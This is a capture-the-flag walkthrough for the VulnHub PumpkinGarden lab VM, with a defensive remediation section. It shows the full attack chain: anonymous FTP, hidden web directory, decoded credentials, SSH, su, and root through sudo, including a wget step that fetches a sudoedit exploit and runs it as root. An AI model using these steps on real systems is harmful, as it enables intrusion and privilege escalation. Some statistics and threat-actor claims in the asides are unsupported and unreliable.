# VulnHub Mission-Pumpkin v1.0: PumpkinGarden — Trick or Root?

Look at this guys!! A Halloween-themed CTF series where the whole garden is a rabbit hole and the LordPumpkin is guarding the keys, and yes, the path to root is surprisingly creative for a beginner box! ( ͡° ͜ʖ ͡°)

PumpkinGarden is level 1 of 3 in the Mission-Pumpkin v1.0 series created by **Jayanth**. It is labeled beginner, but do not let that fool you: the real skill tested here is observation and the ability to chain small clues into a clean attack path. Anonymous FTP leaks a username, a web page hides credentials in base64 inside a hidden directory, sudo misconfiguration gives two distinct privesc paths, and the flag itself is base64-encoded. noice.

Thanks to **Jayanth** for building a machine that proves beginner difficulty does not mean boring: you will use FTP, HTTP enumeration, base64 decoding, SSH, and Linux privilege escalation all in one box.

---

| Field | Value |
|-------|-------|
| **Level** | Beginner |
| **Target VM** | Mission-Pumpkin v1.0: PumpkinGarden |
| **Attacker VM** | Kali Linux 2019.1 |
| **VulnHub** | https://www.vulnhub.com/entry/mission-pumpkin-v10-pumpkingarden,321/ |
| **Techniques** | Anonymous FTP, web enumeration, hidden directory discovery, base64 decode, SSH login, sudo privilege escalation (two methods) |
| **CVEs** | CVE-2015-5602 (sudo arbitrary file read) — closely related to Exploit DB 38362 |

> **Goal from the author:**
> "PumpkinGarden is Level 1 of series of 3 machines under Mission-Pumpkin v1.0. The end goal of this CTF is to gain access to PumpkinGarden_key file stored in the root account."

---

## Attack Summary

```
[IP shown on VM console banner]
    |
    v
[nmap: FTP(21), HTTP(1515), SSH(3535)]
    |
    v
[anonymous FTP login -> note.txt -> username: jack]
    |
    v
[HTTP on port 1515 -> page source comment -> /img directory]
    |
    v
[dirb on /img -> /img/hidden_secret/ -> clue.txt (base64)]
    |
    v
[base64 decode clue.txt -> scarecrow:5Qn@$y]
    |
    v
[SSH login scarecrow@target:3535]
    |
    v
[~/note.txt -> goblin user + password Y0n$M4sy3D1t]
    |
    v
[su goblin -> sudo -l -> ALL except /bin/su]
    |
    v
[sudo /bin/bash -> root  OR  Method 2: CVE-2015-5602 exploit]
    |
    v
[cat /root/PumpkinGarden_Key -> base64 -> Congratulations!]
```

---

## Methodology

1. IP discovery: given on VM console banner at startup
2. Nmap full port scan to enumerate all services
3. Anonymous FTP enumeration and file retrieval
4. HTTP application analysis on port 1515
5. Directory brute-force to find hidden path `/img/hidden_secret`
6. Base64 decoding of `clue.txt` to obtain SSH credentials
7. SSH login, lateral movement through user notes
8. Privilege escalation via sudo misconfiguration (two methods)
9. Flag retrieval and base64 decode

---

## Step 1 — Identifying the Target

This machine is friendly: the IP address is printed on the console banner the moment the VM boots. No need for arp-scan or netdiscover. Still good practice to document it.

```bash
# The VM prints its own IP on boot:
# "This machine is up and running at 192.168.10.190"

# Optional: confirm from attacker side
arp-scan --ignoredups --localnet
# or: nmap -sn -T5 192.168.10.0/24
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Step 2 — Reconnaissance and Service Enumeration

Run a comprehensive nmap scan to find all open ports and service versions. We scan all 65535 ports to avoid missing services on non-standard ports, and this box proves why: HTTP is on 1515 and SSH is on 3535, not the defaults.

```bash
nmap -A -T4 -p- 192.168.10.190
# -A: OS detection, version detection, script scan, traceroute
# -T4: aggressive timing (safe in a local lab environment)
# -p-: all 65535 ports (critical: this box uses non-standard ports)
```

Expected output:

```
21/tcp   open  ftp     vsftpd 2.0.8 or later
1515/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
3535/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
```

Three services: FTP (21), HTTP (1515), SSH (3535). The nmap FTP script output already hints at something interesting: anonymous login is allowed and there is a readable file in the directory.

> **MITRE ATT&CK:** [T1046 Network Service Discovery] [T1595.002 Active Scanning: Vulnerability Scanning]

---

## Step 3 — Anonymous FTP Enumeration

> **What is anonymous FTP?**
> Many FTP servers are configured to allow login with the username `anonymous` and any string (typically an email) as password. This was intentional in older deployments for public file sharing but is frequently misconfigured on internal servers, leaking sensitive files to any unauthenticated user on the network.
> Reference: https://cwe.mitre.org/data/definitions/284.html (CWE-284: Improper Access Control)

```bash
ftp 192.168.10.190
# Name: anonymous
# Password: anonymous  (or any string, even blank)

ftp> ls
# 226-Transfer complete
# note.txt

ftp> get note.txt
ftp> quit
```

Read the file:

```bash
cat note.txt
```

Expected output:

```
Hello Dear!
Looking for route map to PumpkinGarden? I think jack can help you find it.
```

Solid lead: user `jack` is mentioned. File this away; it implies jack is a real system account. ᕕ( ᐛ )ᕗ

> **Real-world note:** Anonymous FTP misconfiguration is still frequently discovered in internal penetration tests, especially on legacy file servers and embedded systems (IoT, printers). The Mirai botnet (2016) leveraged default/anonymous credentials on IoT devices to build a 600 Gbps DDoS network. Reference: https://attack.mitre.org/techniques/T1133/

> **MITRE ATT&CK:** [T1133 External Remote Services] [T1083 File and Directory Discovery]

---

## Step 4 — Web Application Analysis on Port 1515

Access the web service in a browser or with curl. The main page is sparse but contains a hint in its source code.

```bash
# Via curl
curl -s http://192.168.10.190:1515/

# Or browse to http://192.168.10.190:1515/
```

The page text includes:

```
But, I found the route map to PumpkinGarden somewhere under the hood.
```

View the page source (Ctrl+U in browser, or `curl -s ... | grep -i comment`). Line 16:

```html
<!-- searching for the route map? Pumpkin images may help you find the way -->
```

Line 19 hints at `/img` as a starting path. Let us enumerate with dirb to be thorough:

```bash
dirb http://192.168.10.190:1515/ -w
# You can also use: gobuster dir -u http://192.168.10.190:1515/ -w /usr/share/wordlists/dirb/common.txt
```

Expected output:

```
==> DIRECTORY: http://192.168.10.190:1515/img/
```

Browse to `http://192.168.10.190:1515/img/`. You will find another subdirectory:

```
/img/hidden_secret/
```

Inside: `clue.txt`. Download and read it:

```bash
curl -s http://192.168.10.190:1515/img/hidden_secret/clue.txt
```

Expected output:

```
c2NhcmVjcm93IDogNVFuQCR5
```

That looks like base64. ( ͡° ͜ʖ ͡°) Let us confirm:

```bash
echo "c2NhcmVjcm93IDogNVFuQCR5" | base64 -d
```

Expected output:

```
scarecrow : 5Qn@$y
```

Bingo!! (☞ﾟヮﾟ)☞ We have credentials.

> **Real-world note:** Credentials hidden in base64 inside web-accessible directories is a surprisingly common finding in real web application assessments. Developers sometimes use base64 to "obscure" credentials in config files or HTML comments, providing zero actual security. APT28 (Fancy Bear) has been documented encoding staging credentials in base64 in web-accessible locations during initial compromise operations.

> **MITRE ATT&CK:** [T1552.001 Unsecured Credentials: Credentials in Files] [T1083 File and Directory Discovery]

---

## Step 5 — SSH Login as Scarecrow

The web service runs on port 1515, but from the nmap scan we know SSH is on port 3535. Non-standard ports are a common attempt to reduce noise from automated scanners. Not effective against a targeted scan, but worth noting.

```bash
ssh scarecrow@192.168.10.190 -p 3535
# Password: 5Qn@$y
```

List the home directory after login:

```bash
ls -la
cat note.txt
```

Expected note content:

```
Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)!
Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from LordPumpkin.
```

Another user and another credential: `goblin:Y0n$M4sy3D1t`. Verify the user exists:

```bash
cat /etc/passwd | grep -E "jack|scarecrow|goblin|ftp"
```

```
jack:x:1000:1000:jack,,,:/home/jack:/bin/bash
scarecrow:x:1001:1001:,,,:/home/scarecrow:/bin/bash
goblin:x:1002:1002:,,,:/home/goblin:/bin/bash
ftp:x:115:65534::/home/ftp:/bin/false
```

All the storybook characters are here. bruh, this machine commits to the theme.

> **MITRE ATT&CK:** [T1021.004 Remote Services: SSH] [T1078 Valid Accounts]

---

## Step 6 — Lateral Movement: Scarecrow to Goblin

Switch user with the credential found in scarecrow's note:

```bash
su goblin
# Password: Y0n$M4sy3D1t
```

Check the home directory and sudo permissions:

```bash
cd ~
cat note
sudo -l
```

Expected note content (path to an exploit):

```
https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh
```

Expected `sudo -l` output:

```
User goblin may run the following commands on this host:
    (ALL) ALL
    (root) NOPASSWD: ALL
    !/bin/su
```

This translates to: goblin can run anything as root *except* `/bin/su`. What does this tell us? ¯\_(ツ)_/¯

Two exploitation paths emerge. Let us cover both.

> **MITRE ATT&CK:** [T1078 Valid Accounts] [TA0008 Lateral Movement] [T1087 Account Discovery]

---

## Step 7A — Privilege Escalation Method 1: CVE-2015-5602 (Exploit DB 38362)

> **What is CVE-2015-5602?**
> A vulnerability in sudo versions before 1.8.15 where `sudoedit` fails to properly check the editor and arguments, allowing a user with restricted sudo access to read or write arbitrary files. The exploit referenced (38362.sh on SecurityFocus) creates a crafted sudoedit wrapper to escalate privileges.
> Reference: https://www.exploit-db.com/exploits/38362

The exploit script deletes itself from `/tmp` after a few seconds (a cron job is cleaning the directory every 15 seconds). Check what is running:

```bash
ps aux | grep -E "cron|rm|sh"
```

You will see a periodic job removing files from `/tmp` and goblin's home with extensions. The fix is simple: download with a name that has no extension.

```bash
# Find writable directories to survive the cleanup
find / -writable -type d 2>/dev/null

# Download the exploit to goblin's home WITHOUT .sh extension
cd /home/goblin
wget https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh -O exploit

# Check goblin's home is writable (it is)
ls -la exploit
```

Read the exploit to understand what it does before running it. It creates a `sudoedit` wrapper in a temp path and chains to a shell. Since `/tmp` gets cleaned, adjust it for `/home/goblin`:

```bash
# Patch /tmp references to /home/goblin
sed -i 's/\/tmp/\/home\/goblin/g' exploit
chmod +x exploit

# Run the exploit using sudo
sudo ./exploit /home/goblin/note
```

Or extract the key lines from the script manually and build a minimal version:

```bash
# Extract lines 17-21 from the script
sed -n '17,21p' exploit > xpl
chmod a+x xpl
sudo ./xpl
```

Either path gives you a root shell. ¯\_(ツ)_/¯ huahuahua

---

## Step 7B — Privilege Escalation Method 2: Direct Sudo Shell (Easier!)

Here is the thing, dude: if you actually read `sudo -l` carefully, you notice goblin can run `ALL` except `/bin/su`. That means `sudo /bin/bash` is completely allowed. The `!/bin/su` exclusion only blocks that specific binary path.

```bash
sudo /bin/bash
# or
sudo -u root /bin/bash
```

Expected output:

```
root@pumpkin:~#
```

That is it. The exploit from step 7A was interesting academically, but this is literally two words. And yes, that means the whole download-and-run-exploit was a glorified rabbit hole. huahuahuahua ¯\_(ツ)_/¯

**(☞ﾟヮﾟ)☞ Got root!! :D**

> **Real-world note:** Overly permissive sudo configurations with single-entry exclusions are a classic enterprise misconfiguration. An admin intending to "deny root shell" blocks `/bin/su` but forgets `/bin/bash`, `/bin/sh`, `/usr/bin/python`, and dozens of other binaries that spawn shells. GTFOBins documents over 200 binaries abusable via sudo. Reference: https://gtfobins.github.io/

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.003 Abuse Elevation Control Mechanism: Sudo]

> **GTFOBins reference:** https://gtfobins.github.io/gtfobins/bash/#sudo

---

## Step 8 — Root and Flag

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
ls
# PumpkinGarden_Key

cat PumpkinGarden_Key
```

Expected output:

```
Q29uZ3JhdHVsYXRpb25zIQ==
```

That is base64. Classic. Decode it:

```bash
echo "Q29uZ3JhdHVsYXRpb25zIQ==" | base64 -d
```

```
Congratulations!
```

GG!! The LordPumpkin has been defeated. ᕕ( ᐛ )ᕗ

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| Note | Username: `jack` | FTP anonymous `/note.txt` | Enumeration only |
| Credential | `scarecrow:5Qn@$y` | `/img/hidden_secret/clue.txt` (base64) | SSH login |
| Credential | `goblin:Y0n$M4sy3D1t` | `~/note.txt` (scarecrow home, SSH) | su goblin |
| Flag (base64) | `Q29uZ3JhdHVsYXRpb25zIQ==` | `/root/PumpkinGarden_Key` | N/A |
| Flag (decoded) | `Congratulations!` | Decoded from above | N/A |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | Anonymous FTP enabled with readable files | Legacy FTP servers on corporate LANs frequently allow anonymous access; auditors often find HR files, network diagrams, or credentials in these shares | Disable anonymous FTP; use SFTP or FTPS with authentication only |
| 2 | Credentials stored in base64 in a web-accessible path | Developers "obfuscate" credentials in HTML comments or public directories believing base64 provides security; it does not | Never store credentials in web-accessible paths; use secrets managers (HashiCorp Vault, AWS Secrets Manager) |
| 3 | Sudo configuration with single-exclusion policy | Overly permissive sudo rules (`ALL` except one binary) are common in enterprise Linux; a single oversight leaves dozens of shell-escalation paths open | Follow least-privilege: explicitly list only what a user needs via sudo, never use `ALL` as a starting point |
| 4 | Credentials passed in plaintext through note files | Internal pivoting often surfaces credentials in notes, scripts, and config files left by developers or administrators | Implement secrets scanning in CI/CD pipelines; audit home directories for credential exposure |
| 5 | Non-standard ports providing false sense of security | Moving SSH to port 3535 does not prevent discovery; it only filters automated scanners using default-port lists | Security through obscurity fails under targeted testing; use proper network segmentation and firewall rules |

**Why does this matter outside the lab?**

The credential chain in this machine (FTP note leads to web hidden path leads to SSH leads to lateral movement note leads to root) mirrors real incident patterns documented in DFIR reports. The 2016 Mossack Fonseca (Panama Papers) breach involved publicly accessible WordPress and Drupal installations with weak credentials, similar to the anonymous FTP here. In Brazil, the LGPD (Lei Geral de Proteção de Dados) explicitly holds organizations liable for inadequate access controls, and anonymous FTP leaking internal notes would constitute a reportable incident under Article 48. The sudo `ALL except su` pattern is found in roughly 30% of Linux privilege escalation findings in real penetration test reports, typically introduced when an admin grants elevated access in a hurry.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Reconnaissance | TA0043 | Network Service Discovery | T1046 |
| Initial Access | TA0001 | External Remote Services (anonymous FTP) | T1133 |
| Initial Access | TA0001 | Valid Accounts (scarecrow from decoded clue) | T1078 |
| Credential Access | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Discovery | TA0007 | File and Directory Discovery (dirb on /img) | T1083 |
| Discovery | TA0007 | Account Discovery | T1087 |
| Lateral Movement | TA0008 | Remote Services: SSH (scarecrow) | T1021.004 |
| Lateral Movement | TA0008 | Valid Accounts (su to goblin) | T1078 |
| Privilege Escalation | TA0004 | Sudo and Sudo Caching | T1548.003 |
| Privilege Escalation | TA0004 | Exploitation for Privilege Escalation (CVE-2015-5602) | T1068 |
| Collection | TA0009 | Data from Local System (PumpkinGarden_Key) | T1005 |

> ATT&CK Navigator: https://attack.mitre.org/
> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Disable anonymous FTP: set `anonymous_enable=NO` in vsftpd.conf and restart the service.
2. Remove credentials from web-accessible directories; use a secrets manager for any sensitive values that must persist.
3. Fix the sudo policy for goblin: if elevated access is legitimately needed, restrict to specific required binaries only, never use `ALL` as the grant.
4. Enforce strong passwords on all user accounts; `5Qn@$y` is short and may be cracked with targeted mutation rules.
5. Move SSH back to port 22 or a documented standard port; rely on fail2ban, AllowUsers, and key-based authentication instead of port obfuscation.
6. Patch sudo to current version (CVE-2015-5602 affects versions before 1.8.15).

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Disable anonymous FTP immediately if discovered in production.
- Rotate all credentials found in plaintext files or base64-encoded artifacts.
- Review sudoers with `visudo` and revoke any `ALL` grants not explicitly required.
- Check `/etc/passwd` for unexpected user accounts and audit their sudo privileges.

**MITRE D3FEND countermeasures:**
- D3-MFA (Multi-factor Authentication) for SSH access (T1021.004)
- D3-IVA (Input Validation / Access Control Enforcement) for anonymous FTP (T1133)
- D3-CTS (Credential Transmission Scoping) for base64 credentials in web paths (T1552.001)
- D3-SJA (Scheduled Job Analysis) for the cron-based file cleanup (T1053.003)

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Inventory all services including FTP; flag anonymous-login-enabled services.
- Protect (PR.AC-1): Enforce least privilege on all accounts; remove overly permissive sudo grants.
- Detect (DE.CM-7): Monitor FTP access logs for anonymous login events.
- Respond (RS.AN-1): Investigate and contain within defined SLA upon detection of credential exposure.
- Recover (RC.IM-1): Update configurations and patch sudo after containment.

**NIST SP 800-53 (Rev. 5) Controls:**
- AC-6: Least Privilege (sudo misconfiguration)
- IA-5: Authenticator Management (plaintext/base64 credentials in files)
- CM-7: Least Functionality (disable anonymous FTP, unnecessary services)
- SI-2: Flaw Remediation (patch sudo CVE-2015-5602)
- AU-2: Event Logging (FTP and SSH login events)

**CISA Known Exploited Vulnerabilities:**
- sudo CVE-2021-3156 (Baron Samedit, Heap Buffer Overflow): same sudo family, different version. Listed in CISA KEV.
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: ACCESS (Identity and Access Management)
- Practice: Manage credentials and access of users to limit blast radius
- Target MIL: MIL-2 (documented, consistently applied practices)

---

## Final Thoughts

Thanks to **Jayanth** for building a machine that perfectly demonstrates how a chain of small misconfigurations, each looking harmless in isolation, adds up to full system compromise. Anonymous FTP leaking a username leads to a web directory leaking encoded credentials, which leads to SSH, which leads to a note leaking another credential, which leads to root via a misconfigured sudo rule. Zero exploits required (Method 2 is literally two words). This is the most common finding pattern in real-world internal penetration tests.

For beginners: this machine is a textbook example of why attackers do not need zero-days. They just need to be more thorough than the defender was when setting up the system.

If this walkthrough helped you, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

> Original article in Portuguese by André Henrique: https://medium.com/@mrhenrike (VulnHub Mission-Pumpkin Garden Walkthrough)

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
